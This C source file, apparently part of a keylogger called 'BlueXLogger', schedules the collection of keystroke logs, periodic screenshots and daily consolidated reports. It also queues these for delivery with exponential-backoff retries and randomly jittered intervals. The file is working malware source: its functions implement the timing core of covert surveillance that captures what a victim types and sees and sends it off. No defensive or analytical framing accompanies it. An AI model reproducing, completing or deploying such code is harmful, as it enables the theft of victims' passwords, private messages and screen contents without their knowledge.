/*============================================================================
 * BlueXLogger - bxl_schedule.c
 * Batch collection and delivery scheduling.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_schedule.h"
#include "bxl_util.h"

#define BXL_NEVER  ((bxl_u64)0xFFFFFFFFFFFFFFFFULL)

static bxl_u32 xs32(bxl_u32 *s)
{
    bxl_u32 x = *s ? *s : 0x1234567u;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *s = x;
    return x;
}

bxl_u64 bxl_sched_interval_ms(const BxlConfig *cfg, bxl_u32 minutes,
                              bxl_u32 *rng)
{
    bxl_u64 base;
    bxl_u32 span;
    bxl_u32 r;
    bxl_i64 delta;
    bxl_i64 v;

    if (minutes == 0) return BXL_NEVER;

    base = (bxl_u64)minutes * 60000ULL;
    if (!cfg || !cfg->jitter_enabled || cfg->jitter_percent == 0 || !rng)
        return base;

    span = (bxl_u32)((base * (bxl_u64)cfg->jitter_percent) / 100ULL);
    if (span == 0) return base;

    r = xs32(rng);
    delta = (bxl_i64)(r % (2u * span + 1u)) - (bxl_i64)span;
    v = (bxl_i64)base + delta;

    if (v < 5000) v = 5000;   /* never jitter below five seconds */
    return (bxl_u64)v;
}

void bxl_sched_init(BxlSched *s, const BxlConfig *cfg,
                    bxl_u64 now_ms, bxl_u64 now_unix, bxl_u32 seed)
{
    if (!s) return;
    memset(s, 0, sizeof(*s));

    s->start_ms  = now_ms;
    s->rng       = seed ? seed : 0x5EED1234u;
    s->last_daily_yday = -1;

    if (cfg) {
        s->next_log_ms = (cfg->log_interval_min > 0)
                       ? now_ms + bxl_sched_interval_ms(cfg, cfg->log_interval_min, &s->rng)
                       : BXL_NEVER;

        s->next_shot_ms = (cfg->shot_enabled && cfg->shot_interval_min > 0)
                        ? now_ms + bxl_sched_interval_ms(cfg, cfg->shot_interval_min, &s->rng)
                        : BXL_NEVER;

        if (cfg->daily_enabled)
            s->next_daily_unix = bxl_next_daily_utc(cfg->daily_hour,
                                                    cfg->daily_minute, now_unix);
    } else {
        s->next_log_ms  = BXL_NEVER;
        s->next_shot_ms = BXL_NEVER;
    }

    s->next_flush_ms = BXL_NEVER;
}

void bxl_sched_note_keystrokes(BxlSched *s, bxl_u32 count)
{
    if (!s) return;
    if (s->keystrokes > 0xFFFFFFFFu - count) s->keystrokes = 0xFFFFFFFFu;
    else s->keystrokes += count;
}

void bxl_sched_note_log_queued(BxlSched *s)
{
    if (!s) return;
    s->pending_logs++;
    s->batches_collected++;
    /* Fresh work should go out promptly, regardless of any backoff state. */
    if (s->pending_logs + s->pending_shots == 1)
        s->next_flush_ms = 0;
}

void bxl_sched_note_shot_queued(BxlSched *s)
{
    if (!s) return;
    s->pending_shots++;
    s->batches_collected++;
    if (s->pending_logs + s->pending_shots == 1)
        s->next_flush_ms = 0;
}

void bxl_sched_note_delivered(BxlSched *s, bxl_u32 logs, bxl_u32 shots)
{
    if (!s) return;
    if (logs  > s->pending_logs)  s->pending_logs  = 0; else s->pending_logs  -= logs;
    if (shots > s->pending_shots) s->pending_shots = 0; else s->pending_shots -= shots;

    s->batches_delivered += logs + shots;
    s->retry_streak = 0;

    if (s->pending_logs + s->pending_shots == 0)
        s->next_flush_ms = BXL_NEVER;
    else
        s->next_flush_ms = 0;
}

void bxl_sched_note_delivery_failed(BxlSched *s, bxl_u64 now_ms)
{
    bxl_u64 delay;

    if (!s) return;
    if (s->retry_streak < 30) s->retry_streak++;

    delay = (bxl_u64)BXL_RETRY_BASE_MS << (s->retry_streak - 1);
    if (delay > BXL_RETRY_MAX_MS) delay = BXL_RETRY_MAX_MS;

    s->next_flush_ms = now_ms + delay;
}

bxl_u32 bxl_sched_tick(BxlSched *s, const BxlConfig *cfg,
                       bxl_u64 now_ms, bxl_u64 now_unix)
{
    bxl_u32 acts = BXL_ACT_NONE;

    if (!s || !cfg) return BXL_ACT_NONE;

    /* ---- daily consolidated report ------------------------------------- */
    if (cfg->daily_enabled) {
        if (s->next_daily_unix == 0)
            s->next_daily_unix = bxl_next_daily_utc(cfg->daily_hour,
                                                    cfg->daily_minute, now_unix);
        if (now_unix >= s->next_daily_unix) {
            acts |= BXL_ACT_DAILY | BXL_ACT_LOG | BXL_ACT_SHOT;
            s->daily_reports++;
            s->next_daily_unix = bxl_next_daily_utc(cfg->daily_hour,
                                                    cfg->daily_minute, now_unix);
        }
    }

    /* ---- log collection: interval OR keystroke threshold, first wins ---- */
    {
        int log_due = 0;

        if (s->next_log_ms != BXL_NEVER && now_ms >= s->next_log_ms)
            log_due = 1;

        if (!log_due && cfg->log_keystroke_threshold > 0 &&
            s->keystrokes >= cfg->log_keystroke_threshold)
            log_due = 1;

        /* A daily report always carries the log, even if the interval is off. */
        if (acts & BXL_ACT_DAILY)
            log_due = 1;

        if (log_due) {
            acts |= BXL_ACT_LOG;
            s->keystrokes  = 0;
            s->last_log_ms = now_ms;
            /* Re-arm the interval so a threshold trip cannot double-send. */
            s->next_log_ms = (cfg->log_interval_min > 0)
                           ? now_ms + bxl_sched_interval_ms(cfg, cfg->log_interval_min, &s->rng)
                           : BXL_NEVER;
        }
    }

    /* ---- screenshot collection ----------------------------------------- */
    {
        int shot_due = 0;

        if (cfg->shot_enabled && s->next_shot_ms != BXL_NEVER &&
            now_ms >= s->next_shot_ms)
            shot_due = 1;

        if (acts & BXL_ACT_DAILY)
            shot_due = 1;

        if (shot_due) {
            acts |= BXL_ACT_SHOT;
            s->last_shot_ms = now_ms;
            s->next_shot_ms = (cfg->shot_enabled && cfg->shot_interval_min > 0)
                            ? now_ms + bxl_sched_interval_ms(cfg, cfg->shot_interval_min, &s->rng)
                            : BXL_NEVER;
        }
    }

    /* ---- delivery flush ------------------------------------------------ */
    if (s->pending_logs + s->pending_shots > 0 && now_ms >= s->next_flush_ms) {
        acts |= BXL_ACT_FLUSH;
        /* Guard against spinning if the caller ignores the failure callback. */
        s->next_flush_ms = now_ms + BXL_RETRY_BASE_MS;
    }

    return acts;
}

bxl_u64 bxl_sched_ms_until_next(const BxlSched *s, bxl_u64 now_ms,
                                bxl_u64 now_unix)
{
    bxl_u64 best = 60000ULL;   /* never sleep longer than a minute */
    bxl_u64 cand;

    if (!s) return best;

    if (s->next_log_ms != BXL_NEVER && s->next_log_ms > now_ms) {
        cand = s->next_log_ms - now_ms;
        if (cand < best) best = cand;
    }
    if (s->next_shot_ms != BXL_NEVER && s->next_shot_ms > now_ms) {
        cand = s->next_shot_ms - now_ms;
        if (cand < best) best = cand;
    }
    if (s->next_flush_ms != BXL_NEVER && s->next_flush_ms > now_ms) {
        cand = s->next_flush_ms - now_ms;
        if (cand < best) best = cand;
    }
    if (s->next_daily_unix > now_unix) {
        cand = (s->next_daily_unix - now_unix) * 1000ULL;
        if (cand < best) best = cand;
    }

    if (best < 200) best = 200;
    return best;
}
